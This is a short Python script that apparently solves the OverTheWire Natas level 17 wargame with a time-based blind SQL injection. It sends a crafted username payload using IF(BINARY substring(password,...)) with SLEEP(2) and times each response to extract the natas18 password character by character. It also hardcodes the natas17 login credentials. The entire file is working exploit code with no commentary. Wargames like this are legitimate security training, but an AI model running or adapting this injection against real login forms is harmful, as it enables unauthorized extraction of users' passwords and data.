import requests
import string
import time
char=string.ascii_letters+string.digits
pass_l=32
pas=""
i=1

while i<=pass_l:
	for c in char:
		payload={'username':f'natas18" and IF(BINARY substring(password,1,{i})="{pas}{c}",SLEEP(2),0) or username="'}
		start=time.time()
		r=requests.post("http://natas17.natas.labs.overthewire.org/index.php?debug=kkk",auth=("natas17","EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"),data=payload)
		end=time.time()
		dur=end-start
		if dur>1.7:
			i=i+1
			pas+=c
			print("we found string " + pas + " as part of password")
			break
		


